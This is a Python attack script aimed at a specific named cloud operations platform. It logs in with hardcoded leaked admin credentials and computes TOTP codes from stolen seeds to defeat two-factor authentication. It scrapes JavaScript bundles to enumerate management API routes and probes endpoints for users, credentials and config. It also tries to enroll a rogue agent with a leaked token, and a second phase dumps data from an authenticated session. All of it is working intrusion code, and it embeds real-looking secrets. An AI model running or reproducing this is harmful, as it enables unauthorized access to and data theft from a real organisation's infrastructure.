#!/usr/bin/env python3
# i29468: cloud-ops.lumiiai.cn ops platform - login with leaked admin creds + TOTP, enumerate mgmt APIs.
import os, sys, json, time, base64, hmac, hashlib, struct, subprocess, re, tempfile
import urllib.parse as up

HOST = "cloud-ops.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
PASSWORD = "iGIqnu4f8UGepPjBtQRt"
SEEDS = ["76CB3BZ7EFX6W2W3QNP4XW355KNJL56V", "76CB3B7EFX6W2W3QNP4XW355KNJL56V"]
ENROLL = "en_ApQqOrmaeohGaVUqjCk_T7P2miY8yMHV"
START = time.time()
WORK = tempfile.mkdtemp(prefix="ops29468-")
CJ = os.path.join(WORK, "cj")

def b64(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    print("R:%s:%s" % (k, b64(v)), flush=True)

def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def curl(path, method="GET", body=None, headers=None, use_cj=False, save_cj=False,
         timeout=25, maxlen=300000, host=HOST):
    url = path if path.startswith("http") else "https://%s%s" % (host, path)
    hf = os.path.join(WORK, "hdr")
    a = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA, "-D", hf]
    if use_cj:
        a += ["-b", CJ]
    if save_cj:
        a += ["-c", CJ]
    for h in (headers or []):
        a += ["-H", h]
    if body is not None:
        a += ["-X", method, "--data-binary", body if isinstance(body, str) else json.dumps(body)]
        if not any(h.lower().startswith("content-type") for h in (headers or [])):
            a += ["-H", "Content-Type: application/json"]
    elif method != "GET":
        a += ["-X", method]
    a += [url, "-w", "\n__C__%{http_code}"]
    rc, out, err = run(a, timeout=timeout + 20)
    t = out.decode("utf-8", "replace")
    code = ""
    i = t.rfind("__C__")
    if i >= 0:
        code = t[i+5:].strip()[:3]
        t = t[:i]
    hdrs = ""
    try:
        hdrs = open(hf, "r", errors="replace").read()
    except Exception:
        pass
    return {"code": code, "body": t[:maxlen], "headers": hdrs[-3000:], "rc": rc}

def totp(secret, t=None, step=30, digits=6):
    t = int(t if t is not None else time.time())
    s = secret.upper().replace(" ", "")
    s = s + "=" * ((8 - len(s) % 8) % 8)
    try:
        key = base64.b32decode(s)
    except Exception as e:
        return "ERR:%r" % e
    h = hmac.new(key, struct.pack(">Q", t // step), hashlib.sha1).digest()
    o = h[-1] & 0x0f
    return str((struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % (10 ** digits)).zfill(digits)

PHASE = sys.argv[1] if len(sys.argv) > 1 else "a"

# ---------- phase a: routes + login ----------
if PHASE == "a":
    routes = {}
    # 1) fetch SPA bundle
    js = curl("/assets/index-vk_qsCO3.js", timeout=30, maxlen=4000000)
    routes["__bundle"] = {"code": js["code"], "len": len(js["body"]), "head": js["body"][:200]}
    body = js["body"]
    # find chunks
    chunks = sorted(set(re.findall(r'assets/[A-Za-z0-9_\-.]+\.js', body)))[:40]
    routes["__chunks"] = chunks
    texts = [("index", body)]
    for c in chunks[:25]:
        r2 = curl("/" + c, timeout=20, maxlen=2000000)
        texts.append((c, r2["body"]))
    allroutes = set()
    for name, txt in texts:
        for m in re.findall(r'["\'`](/api/[A-Za-z0-9_\-/\.{}\$:]{1,80})["\'`]', txt):
            allroutes.add(m)
    blob = "\n".join(t for _, t in texts)
    keyhits = {}
    for kw in ["login", "2fa", "totp", "mfa", "verify", "session", "enroll", "instance", "agent",
               "command", "exec", "task", "deploy", "provision", "credential", "secret", "user",
               "audit", "unit", "device", "config", "systemd", "file", "shell"]:
        mm = sorted(set(re.findall(r'[\w$./\-]{0,40}' + kw + r'[\w$./\-]{0,40}', blob, re.I)))
        keyhits[kw] = [x for x in mm if "/" in x or len(x) < 60][:25]
    routes["__api_routes"] = sorted(allroutes)
    routes["__keyhits"] = keyhits
    # fetch chunk list text of routes per chunk
    R("ROUTES", routes)

    # 2) login attempts on candidate endpoints
    login_eps = [r for r in sorted(allroutes) if re.search(r"log-?in|sign-?in|auth", r, re.I)]
    login_eps = (login_eps + ["/api/auth/login", "/api/login", "/api/auth/signin", "/api/session"])[:10]
    seen = set(); logins = {}
    for ep in login_eps:
        if ep in seen: continue
        seen.add(ep)
        r = curl(ep, method="POST", body={"username": "admin", "password": PASSWORD, "remember": True},
                 save_cj=True, timeout=20, maxlen=4000)
        logins[ep] = r
        try: os.unlink(CJ)
        except Exception: pass
        time.sleep(0.3)
    R("LOGIN", logins)

    # 3) 2fa verification for any endpoint signaling mfa
    needs = [ep for ep, r in logins.items() if re.search(r"2fa|mfa|totp|otp|verify|code", r["body"], re.I)]
    two = {}
    for ep in sorted(allroutes):
        if re.search(r"2fa|totp|mfa|verify", ep, re.I):
            two.setdefault("eps", []).append(ep)
    base2 = "/api/auth/2fa/verify"
    if re.search(r"/2fa", " ".join(sorted(allroutes)), re.I):
        m = re.search(r'"?(\/api\/[A-Za-z0-9_\-/]*2fa[A-Za-z0-9_\-/]*)', " ".join(sorted(allroutes)))
    cand2 = list(dict.fromkeys([base2] + [e for e in sorted(allroutes) if re.search(r"2fa|totp|verify", e, re.I)]))[:6]
    two["candidates"] = cand2
    # successful login cookie if any
    good = [ep for ep, r in logins.items() if r["code"] == "200" and not re.search(r"error|invalid|failed", r["body"], re.I)]
    two["good_login"] = good
    sess = None
    for ep in good[:1]:
        # redo login to save session
        r = curl(ep, method="POST", body={"username": "admin", "password": PASSWORD, "remember": True}, save_cj=True, timeout=20, maxlen=4000)
        two["relogin"] = {"code": r["code"], "body": r["body"][:600], "setcookie": r["headers"][-1200:]}
    for ep in cand2:
        for sd in SEEDS:
            code = totp(sd)
            r = curl(ep, method="POST", body={"code": code, "totp": code}, use_cj=True, save_cj=True, timeout=20, maxlen=4000)
            two[ep + "|" + sd[:6] + "|" + code] = r
            if r["code"] == "200" and not re.search(r"error|invalid", r["body"], re.I):
                break
        time.sleep(0.4)
    R("TWOFA", two)

    # 4) session probe
    probes = ["/api/auth/me", "/api/me", "/api/session", "/api/user", "/api/version", "/api/health",
              "/api/instances", "/api/devices", "/api/units", "/api/agents", "/api/nodes",
              "/api/tasks", "/api/audit", "/api/config", "/api/users", "/api/enroll", "/api/credentials"]
    res = {}
    for p in probes:
        res[p] = curl(p, use_cj=True, timeout=15, maxlen=6000)
        time.sleep(0.15)
    R("ENUM", res)

    # 5) enroll attempts
    en = {}
    for ep in ["/api/enroll", "/api/agent/enroll", "/api/enroll/agent", "/api/agents/enroll"]:
        for hname in ["Authorization: Bearer " + ENROLL, "X-Enroll-Token: " + ENROLL, "X-Enroll: " + ENROLL,
                      "Authorization: Enroll " + ENROLL]:
            r = curl(ep, method="POST", body={"hostname": "recon29468", "platform": "linux", "token": ENROLL},
                     headers=[hname], timeout=15, maxlen=3000)
            en[ep + "|" + hname.split(":")[0]] = r
        time.sleep(0.2)
    R("ENROLL", en)
    R("DONE", {"elapsed": int(time.time() - START), "work": WORK})
    print("PHASE_A_DONE", flush=True)
    sys.exit(0)

# ---------- phase b: dump everything with session ----------
if PHASE == "b":
    # login once
    def login():
        r = curl("/api/auth/login", method="POST", body={"username": "admin", "password": PASSWORD}, save_cj=True, timeout=20, maxlen=4000)
        return r
    lg = login()
    out = {"login": lg}
    if re.search(r"2fa|mfa|totp|verify", lg["body"], re.I) or lg["code"] != "200":
        for ep in ["/api/auth/2fa/verify", "/api/2fa/verify"]:
            for sd in SEEDS:
                code = totp(sd)
                r = curl(ep, method="POST", body={"code": code}, use_cj=True, save_cj=True, timeout=20, maxlen=3000)
                out["2fa|" + ep + "|" + sd[:6]] = r
                if r["code"] == "200":
                    break
    out["me"] = curl("/api/auth/me", use_cj=True)
    R("B_LOGIN", out)
    eps = json.loads(open(sys.argv[2]).read()) if len(sys.argv) > 2 else []
    dump = {}
    for p in eps:
        dump[p] = curl(p, use_cj=True, timeout=25, maxlen=200000)
        time.sleep(0.2)
    R("B_DUMP", dump)
    R("DONE", {"elapsed": int(time.time() - START)})
    sys.exit(0)
